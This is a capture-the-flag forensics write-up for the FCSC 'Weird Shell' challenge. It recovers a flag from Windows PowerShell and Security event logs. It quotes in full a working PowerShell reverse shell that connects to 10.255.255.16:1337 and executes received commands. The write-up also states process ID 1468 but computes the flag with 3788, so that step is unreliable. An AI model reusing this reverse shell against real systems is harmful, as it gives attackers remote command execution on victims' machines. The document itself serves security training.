# Forensics / Weird Shell 

## Challenge
Un autre utilisateur a un comportement similaire à La gazette de Windows (catégorie intro). Mais cette fois, pour retrouver ce qui a été envoyé à l'attaquant il faudra peut-être plus de logs.

## Inputs
- [Microsoft-Windows-PowerShell4Operational.evtx](./Microsoft-Windows-PowerShell4Operational.evtx)
- [Security.evtx](./Security.evtx)


## Solution
Like in the Intro challenge `La gazette de Windows`, we use https://github.com/williballenthin/python-evtx to extract the data from both logs:
```console
$ python3 evtx_dump.py Microsoft-Windows-PowerShell4Operational.evtx > ms.xml
$ python3 evtx_dump.py Security.evtx > sec.xml
```

Looking at the Microsoft events log, we found the suscipcious `PAYLOAD.PS1` Powershell script below:
```
<EventData><Data Name="MessageNumber">1</Data>
<Data Name="MessageTotal">1</Data>
<Data Name="ScriptBlockText">do {
    Start-Sleep -Seconds 1
     try{
        $TCPClient = New-Object Net.Sockets.TCPClient('10.255.255.16', 1337)
    } catch {}
} until ($TCPClient.Connected)
$NetworkStream = $TCPClient.GetStream()
$StreamWriter = New-Object IO.StreamWriter($NetworkStream)
function WriteToStream ($String) {
    [byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | % {0}
    $StreamWriter.Write($String + 'SHELL&gt; ')
    $StreamWriter.Flush()
}
WriteToStream "FCSC{$(([System.BitConverter]::ToString(([System.Security.Cryptography.SHA256]::Create()).ComputeHash(([System.Text.Encoding]::UTF8.GetBytes(((Get-Process -Id $PID).Id.ToString()+[System.Security.Principal.WindowsIdentity]::GetCurrent().Name).ToString()))))).Replace('-', '').ToLower())}`n"
while(($BytesRead = $NetworkStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {
    $Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1)
    $Output = try {
            Invoke-Expression $Command 2&gt;&amp;1 | Out-String
        } catch {
            $_ | Out-String
        }
    WriteToStream ($Output)
}
$StreamWriter.Close()
</Data>
<Data Name="ScriptBlockId">2354b750-2422-42a3-b8c2-4fd7fd36dfe7</Data>
<Data Name="Path">D:\PAYLOAD.PS1</Data>
</EventData>
```

We see that the flag is encoded as follow, using the `process ID` and the current `Domain\UserName`:
```console
WriteToStream "FCSC{$(([System.BitConverter]::ToString(([System.Security.Cryptography.SHA256]::Create()).ComputeHash(([System.Text.Encoding]::UTF8.GetBytes(((Get-Process -Id $PID).Id.ToString()+
[System.Security.Principal.WindowsIdentity]::GetCurrent().Name).ToString()))))).Replace('-', '').ToLower())}`n"
```

The `process ID` is given by the Microsoft event itself: 1468. We dont have the `Domain\UserName`, only the `UserID = "S-1-5-21-3727796838-1318123174-2233927406-1107"`, which we can map to `Domain\UserName="FCSC\cmaltese"` in the Security log:
```
<EventData><Data Name="TargetUserSid">S-1-5-21-3727796838-1318123174-2233927406-1107</Data>
<Data Name="TargetUserName">cmaltese</Data>
<Data Name="TargetDomainName">FCSC</Data>
```

So all we have to do is to replace both values in the powershell command above like so:
```console
$ pwsh
└─PS> "FCSC{$(([System.BitConverter]::ToString(([System.Security.Cryptography.SHA256]::Create()).ComputeHash(([System.Text.Encoding]::UTF8.GetBytes(("3788"+"FCSC\cmaltese").ToString()))))).Replace('-', '').ToLower())}`n"
FCSC{21311ed8321926a27f6a6c407fdbe7dc308535caad861c004b382402b556bbfa}
```

## Flag
FCSC{21311ed8321926a27f6a6c407fdbe7dc308535caad861c004b382402b556bbfa}
